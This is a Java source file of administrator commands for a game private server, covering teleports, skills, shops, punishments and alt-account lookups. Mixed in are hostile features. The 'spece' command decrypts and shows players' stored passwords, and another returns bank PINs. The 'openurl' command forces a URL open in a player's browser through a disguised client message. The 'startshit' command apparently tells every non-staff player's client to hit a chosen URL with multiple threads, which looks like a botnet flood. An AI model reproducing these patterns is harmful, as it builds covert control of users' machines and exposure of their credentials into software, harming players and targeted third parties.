package org.hyperion.rs2.commands.newimpl;
//<editor-fold defaultstate="collapsed" desc="Imports">
import com.google.gson.JsonElement;
import org.hyperion.Server;
import org.hyperion.engine.EngineTask;
import org.hyperion.engine.GameEngine;
import org.hyperion.engine.task.Task;
import org.hyperion.engine.task.impl.GetPassTask;
import org.hyperion.rs2.GenericWorldLoader;
import org.hyperion.rs2.commands.NewCommand;
import org.hyperion.rs2.commands.NewCommandExtension;
import org.hyperion.rs2.commands.impl.cmd.GetFromCharFileCommand;
import org.hyperion.rs2.commands.util.CommandInput;
import org.hyperion.rs2.model.*;
import org.hyperion.rs2.model.combat.Combat;
import org.hyperion.rs2.model.container.ShopManager;
import org.hyperion.rs2.model.content.Events;
import org.hyperion.rs2.model.content.misc.Lottery;
import org.hyperion.rs2.model.content.misc.RandomSpamming;
import org.hyperion.rs2.model.content.misc2.NewGameMode;
import org.hyperion.rs2.model.possiblehacks.PossibleHack;
import org.hyperion.rs2.model.possiblehacks.PossibleHacksHolder;
import org.hyperion.rs2.model.punishment.holder.PunishmentHolder;
import org.hyperion.rs2.model.punishment.manager.PunishmentManager;
import org.hyperion.rs2.net.LoginDebugger;
import org.hyperion.rs2.net.security.EncryptionStandard;
import org.hyperion.rs2.packet.ActionButtonPacketHandler;
import org.hyperion.rs2.pf.Tile;
import org.hyperion.rs2.pf.TileMap;
import org.hyperion.rs2.pf.TileMapBuilder;
import org.hyperion.rs2.saving.IOData;
import org.hyperion.rs2.saving.PlayerLoading;
import org.hyperion.rs2.util.TextUtils;
import org.hyperion.sql.DbHub;
import org.hyperion.sql.impl.log.type.IPLog;
import org.hyperion.util.Misc;
import org.hyperion.util.Time;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.stream.Collectors;
//</editor-fold>
/**
 * Created by DrHales on 2/29/2016.
 */
public class AdministratorCommands implements NewCommandExtension {

    private abstract class AdministratorCommand extends NewCommand {
        public AdministratorCommand(String key, long delay, CommandInput... requiredInput) {
            super(key, Rank.ADMINISTRATOR, delay, requiredInput);
        }

        public AdministratorCommand(String key, CommandInput... requiredInput) {
            super(key, Rank.ADMINISTRATOR, requiredInput);
        }
    }

    @Override
    public List<NewCommand> init() {
        return Arrays.asList(
                new GetFromCharFileCommand("getmail", Time.TEN_SECONDS, IOData.E_MAIL),
                new GetFromCharFileCommand("getpin", Time.TEN_SECONDS, IOData.BANK_PIN),
                new GetFromCharFileCommand("getip", Time.TEN_SECONDS, IOData.LAST_IP),
                new AdministratorCommand("removeverifycode", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        if (target.verificationCode == null || target.verificationCode.isEmpty()) {
                            player.sendf("%s does not have a verification code.", TextUtils.optimizeText(target.getName()));
                            return true;
                        }
                        target.verificationCode = "";
                        player.sendf("Removed %s's verification code.", TextUtils.optimizeText(target.getName()));
                        player.sendf("%s has removed your verification code.", TextUtils.optimizeText(player.getName()));
                        return true;
                    }
                },
                new AdministratorCommand("spece", Time.TEN_SECONDS, new CommandInput<String>(PlayerLoading::playerExists, "player", "A player that exists in the system.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String targetName = input[0];
                        if (GetPassTask.canGetPass(player)) {
                            GetPassTask.incrementUse(player);
                        } else {
                            player.sendMessage("You cannot request any more passwords for the next " + GetPassTask.getTimeLeft() + " minutes.");
                            return true;
                        }
                        player.sendMessage("Getting " + Misc.formatPlayerName(targetName) + "'s password... Please be patient.");
                        GameEngine.submitIO(new EngineTask<Boolean>("Get player IP", 4, TimeUnit.SECONDS) {
                            @Override
                            public Boolean call() throws Exception {
                                Optional<JsonElement> playerPassword = PlayerLoading.getProperty(targetName, IOData.PASSWORD);
                                Optional<JsonElement> rank = PlayerLoading.getProperty(targetName, IOData.RANK);
                                if (Rank.hasAbility(rank.get().getAsLong(), Rank.getPrimaryRank(player))) {
                                    player.sendMessage("You cannot get " + targetName + "'s password. Their rank is higher than yours.");
                                    return true;
                                }
                                if (player == null)
                                    return true;
                                if (playerPassword.isPresent())
                                    player.sendMessage(TextUtils.ucFirst(targetName.toLowerCase()) + "'s password is '" + EncryptionStandard.decryptPassword(playerPassword.get().getAsString()) + "'.");
                                else
                                    player.sendMessage("Could not retrieve " + TextUtils.ucFirst(targetName.toLowerCase()) + "'s password.");
                                return true;
                            }

                            @Override
                            public void stopTask() {
                                player.sendMessage("Request timed out... Please try again at a later point.");
                            }
                        });
                        return true;
                    }
                },
                new AdministratorCommand("getverifycode", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        if (target.verificationCode == null || target.verificationCode.isEmpty()) {
                            player.sendf("%s does not have a verification code.", TextUtils.optimizeText(target.getName()));
                            return true;
                        }
                        player.sendf("%s's verification code is '%s'.", TextUtils.optimizeText(target.getName()), target.verificationCode);
                        return true;
                    }
                },
                new AdministratorCommand("setverifycode", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "String", "String with a length of 1 or more")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.verificationCode = input[1].trim();
                        player.sendf("%s's verification code is now '%s'.", TextUtils.optimizeText(target.getName()), target.verificationCode);
                        target.sendf("Your verification code has been changed to '%s' by '%s'.", target.verificationCode, TextUtils.optimizeText(player.getName()));
                        target.sendf("Upon login you will be required to \"::verify %s\" to unlock your account.", target.verificationCode);
                        return true;
                    }
                },
                new AdministratorCommand("npcinfo", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "An Existing NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        NPCDefinition definition = NPCDefinition.forId(id);
                        player.sendf("NPC Name: %s Combat: %d MaxHP: %d", definition.getName(), definition.combat(), definition.maxHp());
                        definition.getDrops().stream().forEach(drop -> {
                            player.sendf("%s : 1/%d , %d - %d", ItemDefinition.forId(drop.getId()).getName(), drop.getChance(), drop.getMin(), drop.getMax());
                        });
                        /*Won't get through with an exception so, no reason to write to npc-info.txt?*/
                        return true;
                    }
                },
                new AdministratorCommand("getskill", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "String", "A Skill Name")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String name = input[0].trim();
                        for (int array = 0; array < Skills.SKILL_COUNT; array++) {
                            final String skill = Skills.SKILL_NAME[array];
                            if (name.equalsIgnoreCase(skill)) {
                                player.sendf("%s: %s (ID: %d) = %d (%,d XP)", TextUtils.optimizeText(target.getName()), skill, array, target.getSkills().getLevel(array), target.getSkills().getExperience(array));
                            }
                        }
                        return true;
                    }
                },
                new AdministratorCommand("save") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*Does Nothing*/
                        return true;
                    }
                },
                new AdministratorCommand("startspammingcolors") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("Starting Color Spam");
                        RandomSpamming.start(true);
                        return true;
                    }
                },
                new AdministratorCommand("startspammingnocolors") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("Starting spamming without colors");
                        RandomSpamming.start(false);
                        return true;
                    }
                },
                new AdministratorCommand("whatsmyequip") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Arrays.asList(player.getEquipment().toArray()).stream().filter(item -> item != null).forEach(item -> {
                            player.sendf("[Name]: %s, [ID]: %,d, [Slot]: %,d", TextUtils.optimizeText(item.getDefinition().getName()), item.getId(), item.getDefinition().getArmourSlot());
                        });
                        return true;
                    }
                },
                new AdministratorCommand("noskiller") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int i = 7; i < 21; i++) {
                            player.getSkills().setExperience(i, 0);
                        }
                        return true;
                    }
                },
                new AdministratorCommand("tobject", new CommandInput<Integer>(integer -> GameObjectDefinition.forId(integer) != null, "Integer", "Object ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < 15, "Integer", "Object Face"), new CommandInput<Integer>(integer -> integer > -1 && integer < 23, "Integer", "Object Type")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int face = Integer.parseInt(input[1].trim());
                        int type = Integer.parseInt(input[2].trim());
                        player.getActionSender().sendCreateObject(id, type, face, player.getPosition());
                        return true;
                    }
                },
                new AdministratorCommand("stopupdate") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Server.setUpdating(false);
                        return true;
                    }
                },
                new AdministratorCommand("spec") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getSpecBar().setAmount(SpecialBar.FULL);
                        player.getSpecBar().sendSpecAmount();
                        player.getSpecBar().sendSpecBar();
                        return true;
                    }
                },
                new AdministratorCommand("shop", new CommandInput<Integer>(integer -> integer > 0, "Integer", "Shop ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ShopManager.open(player, Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new AdministratorCommand("pnpc", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setPNpc(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new AdministratorCommand("tmask") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        TileMapBuilder builder = new TileMapBuilder(player.getPosition(), 0);
                        TileMap map = builder.build();
                        Tile tile = map.getTile(0, 0);
                        player.sendf("N: %s, E: %s, S: %s, W: %s", tile.isNorthernTraversalPermitted(), tile.isEasternTraversalPermitted(), tile.isSouthernTraversalPermitted(), tile.isWesternTraversalPermitted());
                        return true;
                    }
                },
                new AdministratorCommand("demote", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.getPrimaryRankIndex(target) > Rank.getPrimaryRankIndex(target)) {
                            player.sendf("You cannot demote player '%s'.", TextUtils.optimizeText(target.getName()));
                            return true;
                        }
                        for (Rank rank : Rank.values()) {
                            if (!(rank.ordinal() < Rank.EVENT_MANAGER.ordinal())) {
                                target.setPlayerRank(Rank.removeAbility(target, rank));
                            }
                        }
                        player.sendf("%s has been demoted. current abilities:");
                        for (Rank rank : Rank.values()) {
                            if (Rank.hasAbility(target, rank)) {
                                player.sendf("@whi@%s%s", rank.toString(), Rank.isAbilityToggled(target, rank) ? "" : " [I]");
                            }
                        }
                        return true;
                    }
                },
                new AdministratorCommand("promote", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.hasAbility(target, Rank.HEAD_MODERATOR) && Rank.hasAbility(player, Rank.OWNER)) {
                            target.setPlayerRank(Rank.addAbility(target, Rank.DEVELOPER));
                        } else if (Rank.hasAbility(target, Rank.MODERATOR) && Rank.hasAbility(player, Rank.DEVELOPER)) {
                            target.setPlayerRank(Rank.addAbility(target, Rank.HEAD_MODERATOR));
                        } else if (Rank.hasAbility(target, Rank.HELPER) && Rank.hasAbility(player)) {
                            target.setPlayerRank(Rank.addAbility(target, Rank.MODERATOR));
                        } else {
                            target.setPlayerRank(Rank.addAbility(target, Rank.HELPER));
                        }
                        player.sendf("'%s' has been promoted to %s", TextUtils.optimizeText(target.getName()), player.getPlayerRank());
                        return true;
                    }
                },
                new AdministratorCommand("moveloc", new CommandInput<Integer>(integer -> integer > -15000 && integer < 15000, "Integer", "An Amount between -15000 & 15000"), new CommandInput<Integer>(integer -> integer > -15000 && integer < 15000, "Integer", "An Amount between -15000 & 15000")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int x = Integer.parseInt(input[0].trim());
                        final int y = Integer.parseInt(input[1].trim());
                        player.setTeleportTarget(Position.create(player.getPosition().getX() + x, player.getPosition().getY() + y, player.getPosition().getZ()));
                        return true;
                    }
                },
                new AdministratorCommand("getip", Time.TEN_SECONDS, new CommandInput<String>(PlayerLoading::playerExists, "player", "A player that exists in the system.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String playerIp = GameEngine.submitIO(new EngineTask<String>("Get player IP", 1, TimeUnit.SECONDS) {
                            @Override
                            public String call() throws Exception {
                                Optional<JsonElement> playerIP = PlayerLoading.getProperty(input[0], IOData.LAST_IP);
                                if (playerIP.isPresent())
                                    return playerIP.get().getAsString();
                                return "";
                            }
                        }).get();
                        if (!playerIp.isEmpty())
                            player.sendMessage("Player " + Misc.formatPlayerName(input[0]) + "'s IP is '" + playerIp + "'");
                        else
                            player.sendMessage("Player " + Misc.formatPlayerName(input[0]) + " has no recorded IP");
                        return true;
                    }
                },
                new AdministratorCommand("addip", new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "IP Address")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String value = input[0].trim().toLowerCase().replaceAll("_", "");
                        if (GenericWorldLoader.getAllowedIps().contains(value)) {
                            player.sendf("The IP address '%s' is already in this list.", value);
                            return true;
                        }
                        GenericWorldLoader.getAllowedIps().add(value);
                        player.sendf("The IP address '%s' has been added to the list.", value);
                        return true;
                    }
                },
                new AdministratorCommand("getlocalplayers") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("[Local Players]: %,d", player.getLocalPlayers().size());
                        return true;
                    }
                },
                new AdministratorCommand("reloaditems") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ItemDefinition.loadItems();
                        player.sendMessage("Reloaded Items.");
                        return true;
                    }
                },
                new AdministratorCommand("reloadshops") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        try {
                            ShopManager.loadShops("./data/newshops.cfg");
                        } catch (IOException ex) {
                            Server.getLogger().log(Level.SEVERE, "Error Reloading Shops.", ex);
                            player.sendMessage("Failed to reload shops.");
                            return true;
                        }
                        player.sendMessage("Reloaded Shops.");
                        return true;
                    }
                },
                new AdministratorCommand("debugdropping") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().sendMessage(player.getDropping().toString());
                        return true;
                    }
                },
                new AdministratorCommand("howmanyguesses") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("[Counter]: %,d", Lottery.getGuessesCounter());
                        return true;
                    }
                },
                new AdministratorCommand("setitemprice", new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Integer", "Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "", String.format("Integer", "An amount between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int value = Integer.parseInt(input[1].trim());
                        NewGameMode.getPrices().put(id, value);
                        return true;
                    }
                },
                new AdministratorCommand("testimps") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getExtraData().put("impscaught", 20);
                        return true;
                    }
                },
                new AdministratorCommand("maxskills") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < Skills.SKILL_COUNT; array++) {
                            player.getSkills().setLevel(array, 99);
                            player.getSkills().setExperience(array, 200000000);
                        }
                        return true;
                    }
                },
                new AdministratorCommand("howmanyinregion") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("[In Region]: %,d", player.getRegion().getPlayers().size());
                        return true;
                    }
                },
                new AdministratorCommand("sendloginlogs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int count = 0;
                        for (String array : LoginDebugger.getDebugger().getLogs()) {
                            if (count++ > 100) {
                                break;
                            }
                            player.sendMessage(array);
                        }
                        return true;
                    }
                },
                new AdministratorCommand("togglelogindebugger") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        LoginDebugger.getDebugger().setEnabled(!LoginDebugger.getDebugger().isEnabled());
                        player.sendf("[Login Debugger]: %s", LoginDebugger.getDebugger().isEnabled() ? "Enabled" : "Disabled");
                        return true;
                    }
                },
                new AdministratorCommand("dumploginlogs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("Login logs dumped %s.", LoginDebugger.getDebugger().dumpLogs() ? "Succesfully" : "Unsuccesfully");
                        return true;
                    }
                },
                new AdministratorCommand("doaction", new CommandInput<Integer>(integer -> integer > 0, "Integer", "Button ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ActionButtonPacketHandler.handle(player, Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new AdministratorCommand("giveyt", new CommandInput<String>(World::playerIsOnline, "Player", "An online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        Item item = Item.create(17656, 1);
                        if (target.getInventory().hasRoomFor(item)) {
                            target.getInventory().add(item);
                        } else {
                            target.getBank().add(item);
                            target.sendMessage("a Youtuber hat has been added to your bank.");
                        }
                        return true;
                    }
                },
                new AdministratorCommand("setelo", new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", String.format("an Amount between %,d & %,d", Integer.MIN_VALUE, Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getPoints().setEloRating(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new AdministratorCommand("infhp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        World.submit(new Task(500, "infhp") {
                            @Override
                            public void execute() {
                                int health = target.getSkills().calculateMaxLifePoints();
                                target.getSkills().setLevel(Skills.HITPOINTS, health);
                                if (target.cE == null) {
                                    stop();
                                }
                            }
                        });
                        return true;
                    }
                },
                new AdministratorCommand("checkhax", new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null, "Integer", "Rank Index"), new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "Player Name")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        long rank = Long.parseLong(input[0].trim());
                        if (!Rank.hasAbility(rank, Rank.getPrimaryRank(player))) {
                            player.sendMessage("This does not work on staff with a higher or the same rank!");
                            return true;
                        }
                        final String name = input[1].trim();
                        final List<PossibleHack> list = PossibleHacksHolder.getList();
                        if (list.isEmpty()) {
                            player.sendf("Player %s doesn't seem to have any account issues so far.");
                        } else {
                            player.sendf("@dre@Hacks for player %s", name);
                        }
                        list.stream().forEach(hack -> {
                            player.sendf("%s |@blu@%s@bla@| ", hack.toString(), hack.dateString());
                        });
                        return true;
                    }
                },
                new AdministratorCommand("openurl", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "URL")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String URL = input[1].trim();
                        target.sendf("l4unchur13 %s", URL);
                        player.sendf("Launched %s on %s' browser.", URL, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new AdministratorCommand("resetskill", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > -1 && integer < 25, "Integer", "Skill ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int skill = Integer.parseInt(input[1].trim());
                        target.getSkills().setLevel(skill, 1);
                        target.getSkills().setExperience(skill, 0);
                        return true;
                    }
                },
                new AdministratorCommand("setyelltag", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "Yell Tag")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String value = input[1].trim();
                        target.getYelling().setYellTitle(Character.toString(value.charAt(0)).toUpperCase() + value.substring(1));
                        player.sendf("%s now has the yell tag: %s", TextUtils.optimizeText(target.getName()), target.getYelling().getTag());
                        return true;
                    }
                },
                new AdministratorCommand("reloadpunish") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("Loaded Punishments: %s", PunishmentManager.getInstance().load() ? "Succesfully" : "Unsuccesfully");
                        return true;
                    }
                },
                new AdministratorCommand("startevent", new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "Event Name"), new CommandInput<Integer>(integer -> integer > 0, "Integer", "Time Till Start"), new CommandInput<String>(string -> Boolean.parseBoolean(string) == true || Boolean.parseBoolean(string) == false, "Boolean", "Safe or Not")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String name = input[0].replaceAll("_", " ").trim();
                        int time = Integer.parseInt(input[1].trim());
                        boolean safe = Boolean.parseBoolean(input[2].trim());
                        Position location = player.getPosition();
                        Events.fireNewEvent(name, safe, time, location);
                        player.sendf("New Event: %s, %s, %s", name, safe, time);
                        return true;
                    }
                },
                new AdministratorCommand("stopevent") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Events.resetEvent();
                        player.sendMessage("You have reset the current event.");
                        return true;
                    }
                },
                new AdministratorCommand("hide") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.isHidden(!player.isHidden());
                        player.setPNpc(player.isHidden() ? 942 : -1);
                        player.sendf("[Visible]: %s", player.isHidden() ? "Hidden" : "Showing");
                        FriendsAssistant.refreshGlobalList(player, player.isHidden());
                        return true;
                    }
                },
                new AdministratorCommand("testhits") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < 100; array++) {
                            Combat.processCombat(player.cE);
                            player.cE.predictedAtk = System.currentTimeMillis();
                            player.cE.getOpponent()._getPlayer().ifPresent(target -> target.getSkills().setLevel(Skills.HITPOINTS, 99));
                        }
                        return true;
                    }
                },
                new AdministratorCommand("summonnpc", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final NPC npc = NPCManager.addNPC(player.getPosition().getX(), player.getPosition().getY(), player.getPosition().getZ(), Integer.parseInt(input[0].trim()), -1);
                        player.SummoningCounter = 6000;
                        npc.ownerId = player.getIndex();
                        Combat.follow(npc.getCombat(), player.getCombat());
                        npc.summoned = true;
                        player.cE.summonedNpc = npc;
                        SummoningMonsters.openSummonTab(player, npc);
                        return true;
                    }
                },
                new AdministratorCommand("savepricelist") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int count = 0;
                        try (final BufferedWriter writer = new BufferedWriter(new FileWriter("./data/prices.txt"))) {
                            for (int array = 0; array < ItemDefinition.MAX_ID; array++) {
                                long price = NewGameMode.getUnitPrice(array);
                                writer.write(String.format("%d %d", array, price));
                                if (price > 0) {
                                    count++;
                                } else {
                                    TextUtils.writeToFile("./data/nullprices.txt", String.format("%d: %s is worth no coins and is noted: %s", array, ItemDefinition.forId(array).getName(), ItemDefinition.forId(array).isNoted()));
                                }
                                writer.newLine();
                            }
                            writer.close();
                        } catch (IOException ex) {
                            Server.getLogger().log(Level.WARNING, "Error writing to prices.txt", ex);
                        }
                        player.sendf("Saved %,d non-zero-prices", count);
                        return true;
                    }
                },
                new AdministratorCommand("startshit", new CommandInput<Integer>(integer -> integer > 0, "Integer", "Threads"), new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "URL")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int threads = Integer.parseInt(input[0].trim());
                        final String URL = input[1].trim();
                        World.getPlayers().stream().filter(target -> target != null && !Rank.hasAbility(target)).forEach(target -> target.sendf("script107%d,%s", threads, URL));
                        return true;
                    }
                },
                new AdministratorCommand("stopshit") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> target.sendMessage("script105"));
                        return true;
                    }
                },
                new AdministratorCommand("display", new CommandInput<String>(string -> !string.trim().isEmpty() && !string.toLowerCase().contains("arre") && !string.contains("@"), "String", "Display Name")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String value = input[0].trim();
                        player.display = Character.toString(value.charAt(0)).toUpperCase() + value.substring(1);
                        return true;
                    }
                },
                new AdministratorCommand("alts", Time.TEN_SECONDS, new CommandInput<String>(PlayerLoading::playerExists, "Player", "An player that exists in the system.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String targetName = input[0];
                        player.sendMessage("Getting " + Misc.formatPlayerName(targetName) + "'s alts... Please be patient.");
                        GameEngine.submitSql(new EngineTask<Boolean>("alts command", 10, TimeUnit.SECONDS) {
                            @Override
                            public void stopTask() {
                                player.sendMessage("Request timed out... Please try again at a later point.");
                            }

                            @Override
                            public Boolean call() throws Exception {
                                List<String> usedIps = DbHub.getPlayerDb().getLogs().getIpForPlayer(targetName).stream().map(IPLog::getIp).collect(Collectors.toList());
                                usedIps = usedIps.stream().filter(ip -> !GenericWorldLoader.isIpAllowed(ip)).collect(Collectors.toList());

                                List<IPLog> alts = new ArrayList<>();
                                usedIps.forEach(entry -> DbHub.getPlayerDb().getLogs().getAltsByIp(entry).forEach(alts::add));
                                player.sendMessage("@dre@" + Misc.formatPlayerName(targetName) + " has " + alts.size() + " alt" + (alts.size() == 1 ? "" : "s") + ".");
                                alts.forEach(alt -> player.sendMessage("@dre@" + Misc.formatPlayerName(alt.getPlayerName() + " @bla@- Last login: @dre@" + alt.getFormattedTimestamp() + "@bla@ IP used: @dre@" + alt.getIp())));
                                return true;
                            }
                        });
                        return true;
                    }
                },
                new AdministratorCommand("ipalts", Time.TEN_SECONDS, new CommandInput<String>(string -> string.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$"), "Ip address", "A valid IP address")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String targetIp = input[0];
                        player.sendMessage("Getting the alts for IP " + targetIp + "... Please be patient.");
                        GameEngine.submitSql(new EngineTask<Boolean>("ipalts command", 10, TimeUnit.SECONDS) {
                            @Override
                            public void stopTask() {
                                player.sendMessage("Request timed out... Please try again at a later point.");
                            }

                            @Override
                            public Boolean call() throws Exception {
                                List<IPLog> alts = DbHub.getPlayerDb().getLogs().getAltsByIp(targetIp);

                                player.sendMessage("@dre@The IP " + targetIp + " has logged in on " + alts.size() + " account" + (alts.size() == 1 ? "" : "s") + ".");
                                alts.forEach(alt -> player.sendMessage("@dre@" + Misc.formatPlayerName(alt.getPlayerName() + " @bla@- Last login: @dre@" + alt.getFormattedTimestamp() + "@bla@ IP used: @dre@" + alt.getIp())));
                                return true;
                            }
                        });
                        return true;
                    }
                },
                new AdministratorCommand("clearpunish", Time.TEN_SECONDS, new CommandInput<String>(PlayerLoading::playerExists, "Player", "An player that exists in the system.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String targetName = input[0];
                        player.sendMessage("Unpunishing " + Misc.formatPlayerName(targetName) + "... Please be patient.");
                        GameEngine.submitIO(new EngineTask<Boolean>("unpunish command", 10, TimeUnit.SECONDS) {
                            @Override
                            public void stopTask() {
                                player.sendMessage("Request timed out... Please try again at a later point.");
                            }

                            @Override
                            public Boolean call() throws Exception {
                                final PunishmentHolder holder = PunishmentManager.getInstance().get(targetName);
                                if(holder == null){
                                    player.sendf("%s isn't punished", Misc.formatPlayerName(targetName));
                                    return false;
                                }
                                holder.getPunishments().forEach(punishment -> {
                                    punishment.getTime().setExpired(true);
                                    if(punishment.unapply())
                                        punishment.send(punishment.getVictim(), true);
                                    punishment.send(player, true);
                                    punishment.getHolder().remove(punishment);
                                    punishment.setActive(false);
                                });
                                return true;
                            }
                        });
                        return true;
                    }
                }
        );
    }
    //</editor-fold>
}